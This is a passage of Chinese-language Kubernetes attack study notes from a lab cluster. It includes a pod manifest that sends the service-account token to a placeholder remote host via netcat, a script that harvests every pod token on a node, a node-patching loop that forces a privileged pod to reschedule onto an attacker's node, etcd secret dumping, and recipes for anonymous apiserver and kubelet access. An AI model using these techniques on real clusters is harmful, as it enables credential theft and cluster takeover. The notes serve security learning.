	"apiVersion": "v1",
	"kind": "Pod",
	"metadata": {
		"name": "cdk-rbac-bypass-create-pod",
		"namespace": "kube-system"
	},
	"spec": {
		"automountServiceAccountToken": true,
		"containers": [{
			"args": ["-c", "apt update && apt install -y netcat; cat /run/secrets/kubernetes.io/serviceaccount/token | nc ${RHOST} ${RPORT}; sleep 300"],
			"command": ["/bin/sh"],
			"image": "ubuntu",
			"name": "ubuntu"
		}],
		"hostNetwork": true,
		"serviceAccountName": "${TARGET_SERVICE_ACCOUNT}"
	}
}
```

### 3.4. list pod token

由于pod中的凭证会挂载到其node节点的文件系统下，具体路径为 /var/lib/kubelet/pods/ ，因此，当我们获取到node节点权限后，我们可以产生列举节点上所有的pod sa token，藉此找到权限更高的token。

```
[root@node01 test]# cat /var/lib/kubelet/pods/01900a44-17bd-47c2-ac99-e319f004dc95/volumes/kubernetes.io~projected/kube-api-access-npwsr/token
eyJhbGciOiJSUzI1Ni...
```

我们也可以通过 Peirates 工具的选项30来辅助完成这个步骤（但是感觉不太好用）。

这里给出sh脚本 `find_tokens.sh` ：

```sh
#!/bin/bash
pods_path="/var/lib/kubelet/pods/"

find "$pods_path" -type f -name "token" | while read -r token_file; do
    service_account_dir=$(dirname "$token_file")
    namespace=`cat $service_account_dir/namespace`
    containers=`ls $service_account_dir/../../../../containers`
    payload=$(cat $token_file | cut -d'.' -f2)
    echo "Token File : $token_file"
    echo "  Namespace: $namespace"
    echo "  Pod image: $containers"
    account=$(echo "$payload" | base64 -d)
    echo "  Token Info: $account"
    echo "--------------------------------------------"
done
```

![find_token](C:/Users/test/Desktop/markdown/kubernetes安全学习笔记/find_token.png)

### 3.5. trampoline

参考 https://www.youtube.com/watch?v=PGsJ4QTlKlQ&ab_channel=CNCF%5BCloudNativeComputingFoundation%5D

我们把k8s 某些插件引入的pod 的sa token拥有高权限的可能性十分高，而拥有高权限的pod可以称为trampoline。或者说 [DaemonSet](https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/) 一类的pod是我们需要关注的。

如果当前node上没有合适的token，我们可以通过“移动蹦床”到当前node的方式来获取高权限token：

1. 明确我们的trampoline pod及所在node
2. 修改其他所有 node 的pod容量为 0 ，并且指定 node 删除该 trampoline pod
3. 等 k8s 自动在我们的 node 上创建该pod后，读取相关sa token  

```language
#开启proxy方便测试
kubectl --kubeconfig /etc/kubernetes/kubelet.conf proxy &

# 将$1节点的pod可分数量设置为0
patch_node(){ 
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: application/json-patch+json" -d '[{"op":"replace","path":"/status/allocatable/pods","value":"0"}]' > /dev/null  
}

# 传入 node01.local 节点名称 ,kubectl get nodes获取
while true ; do patch_node node01.local ; done & 

# 删除目标pod
kubectl delete pods -n kube-system xxx-pod

# 查看本地node新增的token
./find_token.sh
```



## 4. k8s compoents&service

### 4.1. 概述

k8s的组件有如下几种类型：

- 控制面板组件 control pannel compoents：kube-apiserver 、etcd ...
- 节点组件 node compoents：kubelet、kube proxy ...
- 插件 add-ons ：core-dns 、flannel ..

通常默认配置下，master节点只会运行组件相关的pod；控制面板组件、coredns只有运行在mater ，kubelet、 kube-proxy在每台节点都会运行。

我们可以在镜像地址中看到相关组件的版本信息：

```
[root@master test]# kubectl get node -o yaml 
...
    - names:
      - registry.cn-hangzhou.aliyuncs.com/google_containers/etcd@sha256:dd75ec974b0a2a6f6bb47001ba09207976e625db898d1b16735528c009cb171c
      - registry.cn-hangzhou.aliyuncs.com/google_containers/etcd:3.5.6-0
      sizeBytes: 299475478
    - names:
      - registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver@sha256:ea06879db80822d74c66d85e082419c4aba3e62c1b3819a9b945751fd6c9aa1a
      - registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver:v1.23.16
      sizeBytes: 129999849
    - names:
      - registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager@sha256:293fb3b10595870f5ff7ec9d4b9e400c3e7832450786aaffb030f0f98f61504f
      - registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager:v1.23.16
      sizeBytes: 119940367
    - names:
      - registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy@sha256:a236f1ebece97ec68ed406b001a8127c06097fc7ef1a9f2421801d48e75d267e
      - registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.23.16
      sizeBytes: 110832791

```

查看k8s相关进程：有 kube-proxy flannld(网络插件) 、etcd 、kube-controller-manager、 kube-scheduler、kubelet

```
[root@master test]# ps -ef | grep kube
root       9320   9305  0 Jul28 ?        00:00:47 /usr/local/bin/kube-proxy --config=/var/lib/kube-proxy/config.conf --hostname-override=node
root       9893   9870  0 Jul28 ?        00:04:49 /opt/bin/flanneld --ip-masq --kube-subnet-mgr
root      31929  31912  1 01:24 ?        00:01:04 etcd --advertise-client-urls=https://192.168.128.129:2379 --cert-file=/etc/kubernetes/pki/etcd/server.crt --client-cert-auth=true --data-dir=/var/lib/etcd --experimental-initial-corrupt-check=true --initial-advertise-peer-urls=https://192.168.128.129:2380 --initial-cluster=node=https://192.168.128.129:2380 --key-file=/etc/kubernetes/pki/etcd/server.key --listen-client-urls=https://127.0.0.1:2379,https://192.168.128.129:2379 --listen-metrics-urls=http://127.0.0.1:2381 --listen-peer-urls=https://192.168.128.129:2380 --name=node --peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt --peer-client-cert-auth=true --peer-key-file=/etc/kubernetes/pki/etcd/peer.key --peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt --snapshot-count=10000 --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt
root      32294  32277  2 01:24 ?        00:01:48 kube-controller-manager --allocate-node-cidrs=true --authentication-kubeconfig=/etc/kubernetes/controller-manager.conf --authorization-kubeconfig=/etc/kubernetes/controller-manager.conf --bind-address=127.0.0.1 --client-ca-file=/etc/kubernetes/pki/ca.crt --cluster-cidr=10.245.0.0/16 --cluster-name=kubernetes --cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt --cluster-signing-key-file=/etc/kubernetes/pki/ca.key --controllers=*,bootstrapsigner,tokencleaner --kubeconfig=/etc/kubernetes/controller-manager.conf --leader-elect=true --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt --root-ca-file=/etc/kubernetes/pki/ca.crt --service-account-private-key-file=/etc/kubernetes/pki/sa.key --service-cluster-ip-range=10.96.0.0/16 --use-service-account-credentials=true
root      32446  32428  0 01:24 ?        00:00:13 kube-scheduler --authentication-kubeconfig=/etc/kubernetes/scheduler.conf --authorization-kubeconfig=/etc/kubernetes/scheduler.conf --bind-address=127.0.0.1 --kubeconfig=/etc/kubernetes/scheduler.conf --leader-elect=true
root      46234  46218  3 Jul31 ?        00:14:24 kube-apiserver --advertise-address=192.168.128.129 --allow-privileged=true --authorization-mode=Node,RBAC --client-ca-file=/etc/kubernetes/pki/ca.crt --enable-admission-plugins=NodeRestriction --enable-bootstrap-token-auth=true --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key --etcd-servers=https://127.0.0.1:2379 --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key --requestheader-allowed-names=front-proxy-client --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt --requestheader-extra-headers-prefix=X-Remote-Extra- --requestheader-group-headers=X-Remote-Group --requestheader-username-headers=X-Remote-User --secure-port=6443 --service-account-issuer=https://kubernetes.default.svc.cluster.local --service-account-key-file=/etc/kubernetes/pki/sa.pub --service-account-signing-key-file=/etc/kubernetes/pki/sa.key --service-cluster-ip-range=10.96.0.0/16 --tls-cert-file=/etc/kubernetes/pki/apiserver.crt --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
root      96949      1  1 02:40 ?        00:00:06 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --hostname-override=node --network-plugin=cni --pod-infra-container-image=registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.6 --read-only-port=10255

```

相关pod

```
[root@master test]# kubectl get pods -A
NAMESPACE      NAME                           READY   STATUS             RESTARTS        AGE
kube-flannel   kube-flannel-ds-5bzvj          1/1     Running            2 (14d ago)     16d
kube-flannel   kube-flannel-ds-n22n5          1/1     Running            0               16d
kube-system    coredns-65c54cc984-x4cn2       0/1     CrashLoopBackOff   341 (21s ago)   11d
kube-system    coredns-65c54cc984-zwmqw       0/1     CrashLoopBackOff   338 (25s ago)   6d2h
kube-system    etcd-node                      1/1     Running            1 (86m ago)     13d
kube-system    kube-apiserver-node            1/1     Running            0               7h1m
kube-system    kube-controller-manager-node   1/1     Running            23 (86m ago)    21d
kube-system    kube-proxy-nfxlj               1/1     Running            2 (14d ago)     21d
kube-system    kube-proxy-wbbmg               1/1     Running            1 (16d ago)     16d
kube-system    kube-scheduler-node            1/1     Running            23 (86m ago)    21d

```



### 4.2. kube-apiserver&kube-proxy 

&emsp;&emsp;k8s的的各资源体现为RBAC的role，当我们的user/group/sa绑定了相关role，即可使用这些资源，即可访问相关的API。apiserver负责暴露各组件功能api，当我们能访问并操作apiserver各接口功能时我们就掌控了整个k8s集群。

&emsp;&emsp;[kube-proxy](https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-proxy/) 是集群中每个[节点（node）](https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/)上所运行的网络代理， 实现 Kubernetes [服务（Service）](https://kubernetes.io/zh-cn/docs/concepts/services-networking/service/) 概念的一部分。kube-proxy 维护节点上的一些网络规则， 这些网络规则会允许从集群内部或外部的网络会话与 Pod 进行网络通信。

&emsp;&emsp;默认情况下kubeadm没有开启HTTP端口，而HTTP端口是允许匿名访问的。

&emsp;&emsp;在apiserver的配置文件中加入相关选项可开启，但这个选项笔者在最近的[参考文档](https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-apiserver/)中没有看到，应该是在某个版本被删除了，已经不再起作用了，笔者因此也没有复现成功：

```
[root@master test]# vi /etc/kubernetes/manifests/kube-apiserver.yaml
...
spec:
  containers:
  - command:
    - kube-apiserver
    - --insecrue-port=8080
    - --insecure-bind-address=0.0.0.0

```

&emsp;&emsp;有时候开发运维可能为了方便从而临时开始kubectl proxy 转发apiserver 8080 的功能，该proxy默认端口为8001

```
[root@master test]# kubectl proxy
Starting to serve on 127.0.0.1:8001

[root@master test]# kubectl proxy --address=0.0.0.0 --accept-hosts=^.*$
Starting to serve on [::]:8001

```

通过以下测试输出，我们可以理解kube-proxy:

```
[root@master test]# kubectl proxy --address=0.0.0.0 --accept-hosts=^.*$ -v 8
I0801 01:41:59.105156   43819 loader.go:374] Config loaded from file:  /root/.kube/config
Starting to serve on [::]:8001
I0801 01:42:01.937281   43819 proxy_server.go:91] /api/v1/namespaces/default/pods matched ^.*
I0801 01:42:01.937339   43819 proxy_server.go:91] 192.168.128.129 matched ^.*$
I0801 01:42:01.937362   43819 proxy_server.go:131] Filter accepting GET /api/v1/namespaces/default/pods 192.168.128.129
I0801 01:42:01.937440   43819 upgradeaware.go:316] Request was not an upgrade
I0801 01:42:01.937696   43819 round_trippers.go:463] GET https://192.168.128.129:6443/api/v1/namespaces/default/pods?limit=500
I0801 01:42:01.937726   43819 round_trippers.go:469] Request Headers:
I0801 01:42:01.937749   43819 round_trippers.go:473]     Kubectl-Session: e4801cb4-18c6-4e10-8554-e37702b1d092
I0801 01:42:01.937756   43819 round_trippers.go:473]     Accept-Encoding: gzip
I0801 01:42:01.937761   43819 round_trippers.go:473]     User-Agent: kubectl/v1.27.3 (linux/amd64) kubernetes/25b4e43
I0801 01:42:01.937780   43819 round_trippers.go:473]     Accept: application/json;as=Table;v=v1;g=meta.k8s.io,application/json;as=Table;v=v1beta1;g=meta.k8s.io,application/json
I0801 01:42:01.937785   43819 round_trippers.go:473]     X-Forwarded-For: 192.168.128.128
I0801 01:42:01.937810   43819 round_trippers.go:473]     Kubectl-Command: kubectl get
I0801 01:42:01.945237   43819 round_trippers.go:574] Response Status: 200 OK in 7 milliseconds
I0801 01:42:01.945267   43819 round_trippers.go:577] Response Headers:
I0801 01:42:01.945274   43819 round_trippers.go:580]     Content-Length: 2935
I0801 01:42:01.945279   43819 round_trippers.go:580]     Date: Tue, 01 Aug 2023 08:42:01 GMT
I0801 01:42:01.945284   43819 round_trippers.go:580]     Audit-Id: 1952543d-2fad-41e1-a067-d13d43a76163
I0801 01:42:01.945288   43819 round_trippers.go:580]     Cache-Control: no-cache, private
I0801 01:42:01.945292   43819 round_trippers.go:580]     Content-Type: application/json
I0801 01:42:01.945301   43819 round_trippers.go:580]     X-Kubernetes-Pf-Flowschema-Uid: fd75401f-ee88-4455-8239-f026f7d6f316
I0801 01:42:01.945305   43819 round_trippers.go:580]     X-Kubernetes-Pf-Prioritylevel-Uid: 69e890ad-3733-41d3-a5c0-b7c43c2f4075

```

&emsp;&emsp;apiserver的HTTPS的端口默认为6443，默认不允许匿名访问，客户端访问该HTTPS端口时可选择校验服务器的证书，当我们忽略证书校验时可如下操作：

```
kubectl -s https://192.168.128.129:6443 --insecure-skip-tls-verify=true ...
https://192.168.128.129:6443/api/v1/componentstatuses
curl https://192.168.128.129:6443/api/v1 --insecure

```

&emsp;&emsp;HTTPS端口默认直接拒绝匿名请求：

```
[root@master test]# curl https://192.168.128.129:6443/api/v1/pods --insecure
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
```

&emsp;&emsp;当我们开启 匿名认证 选项后， 匿名请求的用户名为 `system:anonymous`， 用户组名为 system:unauthenticated，换句话说，开启该选项后，匿名请求被设置了指定的用户和用户组。

```
spec:
  containers:
  - command:
    - kube-apiserver
    - --anonymous-auth=true

```

&emsp;&emsp;开启后匿名访问为403：

```
[root@master test]# curl https://192.168.128.129:6443/api/v1 --insecure
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/api/v1\"",
  "reason": "Forbidden",
  "details": {},
  "code": 403
}
```

&emsp;&emsp;我们为system:anonymous绑定相关角色，赋予权限后就可以通过匿名用户访问相关资源：

```
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: anonymous-pod-viewer
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]

```

```
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: anonymous-pod-viewer-binding
subjects:
  - kind: User
    name: system:anonymous
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: anonymous-pod-viewer
  apiGroup: rbac.authorization.k8s.io
```

```
[root@master test]# curl https://192.168.128.129:6443/api/v1 --insecure
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/api/v1\"",
  "reason": "Forbidden",
  "details": {},
  "code": 403
}[root@master test]# curl https://192.168.128.129:6443/api/v1/pods --insecure
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "432700"
  },
  "items": [

```

### 4.3. etcd

etcd拥有一致且高可用的键值存储能力，用作 Kubernetes 所有集群数据的后台数据库。你可以在官方[文档](https://etcd.io/docs/)中找到有关 etcd 的深入知识。

从目前笔者看到的知识点，对etcd有如下理解：user account通常为X509客户端认证，user account目前看到的通常都是k8s组件或admin用户，即凭证都是配置文件形式，所以etcd中看不到admin用户的凭证；etcd存储了service account的相关凭证。

etcdctl 工具可在github下载 ：https://github.com/etcd-io/etcd/releases/ ，etcdctl工具中的 user、role 等选项与k8s没有关系，与etcd有关系。

可以通过以下环境变量指定工具的API版本及认证信息

```
export ETCDCTL_API=3
export ETCDCTL_CERT=
export ETCDCTL_CACERT=
export ETCDCTL_KEY=
```

etcd默认不允许匿名访问，另外看到有人说回环地址下etcd默认允许匿名访问，但我验证的结果为否，可能是旧版本功能。

关于配置etcd未授权访问：查看官方文档没有找到etcd匿名访问的配置，另外即便将 client-cert-auth 设置为false也不行 ，参考 https://etcd.io/docs/v3.4/op-guide/configuration/ 、https://etcd.io/docs/v2.3/configuration/ 。

有etcd访问权限情况下，可通过如下操作获取权限下：

```
检查etcd服务器状态
[root@master test]# ./etcdctl --endpoints=https://192.168.128.129:2379 --cert /etc/kubernetes/pki/etcd/server.crt --key /etc/kubernetes/pki/etcd/server.key --cacert /etc/kubernetes/pki/etcd/ca.crt endpoint health
https://192.168.128.129:2379 is healthy: successfully committed proposal: took = 4.822828ms

列出所有key，查看secret
[root@master test]# ./etcdctl --endpoints=https://192.168.128.129:2379 --cert /etc/kubernetes/pki/etcd/server.crt --key /etc/kubernetes/pki/etcd/server.key --cacert /etc/kubernetes/pki/etcd/ca.crt get / --prefix --keys-only | grep /secrets/ | grep clusterrole
/registry/secrets/kube-system/clusterrole-aggregation-controller-token-5sc24

查看token
[root@master test]#./etcdctl --endpoints=https://192.168.128.129:2379 --cert /etc/kubernetes/pki/etcd/server.crt --key /etc/kubernetes/pki/etcd/server.key --cacert /etc/kubernetes/pki/etcd/ca.crt get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-5sc24
token:eyJhbGciOiJS ....

```

拿到token后我们可以以前面操作sa token一样的方式去访问api server，如果没有找到admin权限的token也没关系，因为etcd存储的这些token必然有可以操作 clusterrole、clusterrulebinding权限的token，我们通过修改权限的方式也能提权到admin。提权可以参考其他章节。

### 4.4. kubelet

kubelet相关配置选项：https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/

`kubelet` 会在集群中每个[节点（node）](https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/)上运行。 它保证[容器（containers）](https://kubernetes.io/zh-cn/docs/concepts/overview/what-is-kubernetes/#why-containers)都运行在 [Pod](https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/) 中。

kubelet 接收一组通过各类机制提供给它的 PodSpecs， 确保这些 PodSpecs 中描述的容器处于运行状态且健康。 kubelet 不会管理不是由 Kubernetes 创建的容器。

从下面的命令输出可知，kubelet默认监听端口为10248 36379 10250，且会与apiserver建立tcp长连接：

```
[root@master test]# netstat -anopt | grep kubelet
tcp        0      0 127.0.0.1:10248         0.0.0.0:*               LISTEN      956/kubelet          off (0.00/0/0)
tcp        0      0 127.0.0.1:36379         0.0.0.0:*               LISTEN      956/kubelet          off (0.00/0/0)
tcp        0      0 192.168.128.129:35404   192.168.128.129:6443    ESTABLISHED 956/kubelet          keepalive (17.83/0/0)
tcp6       0      0 :::10250                :::*                    LISTEN      956/kubelet          off (0.00/0/0)

```

目前版本默认没有开启10255端口，我们可以通过如下命令来开启：

```
[root@master test]# cat /etc/sysconfig/kubelet
KUBELET_EXTRA_ARGS="--read-only-port=10255"
[root@master test]# service kubelet restart
```

10250默认不允许匿名访问，要配置为匿名访问，我们需要修改 /var/lib/kubelet/config.yaml 的anonymous.enabled、authorization.mode 选项，并delete kubelet pod让其重新创建：

```
apiVersion: kubelet.config.k8s.io/v1beta1
authentication:
  anonymous:
    enabled: true
  webhook:
    cacheTTL: 0s
    enabled: true
  x509:
    clientCAFile: /etc/kubernetes/pki/ca.crt
authorization:
  mode: AlwaysAllow

```

从官方代码 v1.24.16 pkg/kubelet/server/server 来看，10255端口kubeCfg.EnableDebuggingHandlers默认false，而10250默认true，true情况下的debug模式的路由 有 InstallDebuggingHandlers（ /run /exec /attach /portForward /containerLogs /runningpods） 、InstallSystemLogHandler等。其他公共的路由为 InstallDefaultHandlers ，包括 /pods  /stats /metrics 等。

未授权访问情况下，如果对DEBUG路由有访问权限则可以通过如下方式创建容器，也可以通过查看容器配置信息找到高权限容器：

| Kubelet API | 用法示例                                                     | 描述                             |
| ----------- | ------------------------------------------------------------ | -------------------------------- |
| /pods       | GET /pods                                                    | 列出所有的pods                   |
| /run        | POST /run/<podNamespace>/<podID>/<containerName>POST /run/<podNamespace>/<podID>/<uid>/<containerName>Body: <command> | 在容器内执行命令                 |
| /exec       | GET /exec/<podNamespace>/<podID>/<containerName>?command=<command>POST /exec/<podNamespace>/<podID>/<containerName>?command=<command>GET /exec/<podNamespace>/<podID>/<uid>/<containerName>?command=<command>POST /exec/<podNamespace>/<podID>/<uid>/<containerName>?command=<command> | 通过数据流的方式在容器内执行命令 |

相关深入利用工具 ： https://github.com/cyberark/kubeletctl

### 4.5. service & nodeport

https://kubernetes.io/docs/concepts/services-networking/service/#type-nodeport

service：pod的使用者有时候需要向k8s集群外部暴露IP地址或端口，从而可以对外提供访问。

如果用户使用 nodeport 类型的service来暴露服务，默认端口为 30000-32767 

## 5. pod&container

pod是k8s集群中的资源单位，根据官方说法，pod可以由多个容器组成。

### 5.1. docker信息收集

通过以下的命令，我们可以判断当前环境是否在容器中及k8s集群中，另外我们需要探明控制组件的网络地址、当前容器是否特权容器、capalilites情况

```
ps aux
ls -l .dockerenv
capsh --print
env | grep KUBE
ls -l /run/secrets/kubernetes.io/
mount
df -h
cat /etc/resolv.conf
cat /etc/mtab
cat /proc/self/status
cat /proc/self/mounts
cat /proc/net/unix
cat /proc/1/mountinfo
```



```
/.dockerenv
dockerenv是所有容器中都会存在的这个文件，这个文件曾是lcx用于环境变量加载到容器中，现在容器不再使用lcx所以内容为空，通过这种方式来识别当前环境是否在容器中。

非容器环境下，1号进程一般都是init或者是systemd这一类的，如下所示：
[root@node01 test]# cat /proc/1/cmdline
/usr/lib/systemd/systemd--switched-root--system--deserialize22

cgroup用于限制进程资源：可以看到进程cgroup文件含有docker字符，另外kubepods则表示其在k8s集群中
root@nginx:/# cat /proc/1/cgroup
11:cpuacct,cpu:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-podd60bc08a_3fb8_4f59_9334_b357266b6d2d.slice/docker-0982ed39516c95208927f71a7a13463abe3197b227285c9f03d2d71dbe88eb7e.scope
10:cpuset:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-podd60bc08a_3fb8_4f59_9334_b357266b6d2d.slice/docker-0982ed39516c95208927f71a7a13463abe3197b227285c9f03d2d71dbe88eb7e.scope
9:memory:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-podd60bc08a_3fb8_4f59_9334_b357266b6d2d.slice/docker-0982ed39516c95208927f71a7a13463abe3197b227285c9f03d2d71dbe88eb7e.scope
8:devices:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-podd60bc08a_3fb8_4f59_9334_b357266b6d2d.slice/docker-0982ed39516c95208927f71a7a13463abe3197b227285c9f03d2d71dbe88eb7e.scope
7:pids:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-podd60bc08a_3fb8_4f59_9334_b357266b6d2d.slice/docker-0982ed39516c95208927f71a7a13463abe3197b227285c9f03d2d71dbe88eb7e.scope
6:freezer:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-podd60bc08a_3fb8_4f59_9334_b357266b6d2d.slice/docker-0982ed39516c95208927f71a7a13463abe3197b227285c9f03d2d71dbe88eb7e.scope
5:hugetlb:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-podd60bc08a_3fb8_4f59_9334_b357266b6d2d.slice/docker-0982ed39516c95208927f71a7a13463abe3197b227285c9f03d2d71dbe88eb7e.scope
4:perf_event:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-podd60bc08a_3fb8_4f59_9334_b357266b6d2d.slice/docker-0982ed39516c95208927f71a7a13463abe3197b227285c9f03d2d71dbe88eb7e.scope
3:net_prio,net_cls:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-podd60bc08a_3fb8_4f59_9334_b357266b6d2d.slice/docker-0982ed39516c95208927f71a7a13463abe3197b227285c9f03d2d71dbe88eb7e.scope
2:blkio:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-podd60bc08a_3fb8_4f59_9334_b357266b6d2d.slice/docker-0982ed39516c95208927f71a7a13463abe3197b227285c9f03d2d71dbe88eb7e.scope
1:name=systemd:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-podd60bc08a_3fb8_4f59_9334_b357266b6d2d.slice/docker-0982ed39516c95208927f71a7a13463abe3197b227285c9f03d2d71dbe88eb7e.scope

docker默认以overlay来控制文件系统
root@nginx:/# mount | grep docker
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/FHV5BUNYG6AZFUIFGIHVOAX6DX:/var/lib/docker/overlay2/l/L4D33GZXBM3NR7EW75HODAJDYA:/var/lib/docker/overlay2/l/YBSDBNL7ORVJ3GEFKXL6ZLZSAC:/var/lib/docker/overlay2/l/JOB4HMIJ3VEGNWNF46SESCCBIE:/var/lib/docker/overlay2/l/AHPORQ46H5KGHGAYYTSOKY7UZL:/var/lib/docker/overlay2/l/QTLMKGIFJS7JNHSMUNLUIXAOOE:/var/lib/docker/overlay2/l/P2PAOEKDKVLWAZ3ULRIFKQ6XTK:/var/lib/docker/overlay2/l/TRQXMIOLWYS6UGUXMEA4XNMTEO,upperdir=/var/lib/docker/overlay2/d6974e1b4f804ae228b7207bfcff740e96326071f37cdd84f502098739025116/diff,workdir=/var/lib/docker/overlay2/d6974e1b4f804ae228b7207bfcff740e96326071f37cdd84f502098739025116/work)

默认情况下，k8s的pod会在本地保存service account
root@nginx:/# ls /run/secrets/kubernetes.io/serviceaccount/
ca.crt  namespace  token


root@nginx:/# cat /etc/shadow
root:*:19541:0:99999:7:::
daemon:*:19541:0:99999:7:::
bin:*:19541:0:99999:7:::
sys:*:19541:0:99999:7:::
sync:*:19541:0:99999:7:::
games:*:19541:0:99999:7:::
man:*:19541:0:99999:7:::
lp:*:19541:0:99999:7:::
mail:*:19541:0:99999:7:::
news:*:19541:0:99999:7:::
uucp:*:19541:0:99999:7:::
proxy:*:19541:0:99999:7:::
www-data:*:19541:0:99999:7:::
backup:*:19541:0:99999:7:::
list:*:19541:0:99999:7:::
irc:*:19541:0:99999:7:::
_apt:*:19541:0:99999:7:::
nobody:*:19541:0:99999:7:::
nginx:!:19542::::::
root@nginx:/#


root@nginx:/# env
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
HOSTNAME=nginx
PWD=/
PKG_RELEASE=1~bookworm
HOME=/root
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
NJS_VERSION=0.7.12
TERM=xterm
SHLVL=1
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443

```

capabilites信息收集见 “容器逃逸 - capabilites”

### 5.2. pod service account

见 “使用sa token”一节

```
 curl --header "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IndWRWJ5UklGa0RNdEtBaEgzd3BEdHUzZlZVZEdFYkk1UzRhbW9laDdKcmsifQ.eyJhdWQOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzIxNDQyODM2LCJpYXQiOjE2ODk5MDY4MzYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjA0NDZjMWJjLTlkYzgtNDBmMi1iZjllLTlhZmY3NGRiODBkMCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjExM2Q4MGRhLTcwZTYtNGJlYS05MmU2LTgxZGE2NDc3ODBhZSJ9LCJ3YXJuYWZ0ZXIiOjE2ODk5MTA0NDN9LCJuYmYiOjE2ODk5MDY4MzYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.YYqWGNJokhbODI6iGYNt9FVInQmwb-2ujYn94Z6e-wOScbs90Q7x3HaJ_2NhXVIl6TrlVtOI76ApenncMu-d5ieeqO8t3rwKiWrp3xwkbaLy7-4UawPZxtnO40V7S_s75E0AD74o9PkLMAD_Dr9NZy5yuKqhWIlnfGf8bdsyGrGk_-9sdpQVt3VGtNoXtJ__vgoizcWVen6C8N74LPuh1B84lvGjZFB02mRrBQr88aLU7FCSox7404Q74lTM_tSjhhqop9SgIdNx-E7nX9sz_nMxoMiNuJTYX80S2GA-O9FpqqT0DLO2TVwG4LfHvZI2oQX52OqRxtZwOYHPIewAqQ" -X GET https://192.168.128.129:6443/api/ --insecure
```

### 5.3. 容器内的网络

目前云原生下，主流的网络架构还是传统的 `主机网络`。我们自己搭建的k8s集群默认是看不到其他pod、k8s apiserver的，但实际生产环境，为了方便 及 保障服务可靠，运维&开发 部署的k8s为 主机网络 这种开放式的网络，但这种未隔离的网络是不成熟的做法。

https://github.com/neargle/my-re0-k8s-security#4-%E5%AE%B9%E5%99%A8%E7%BD%91%E7%BB%9C

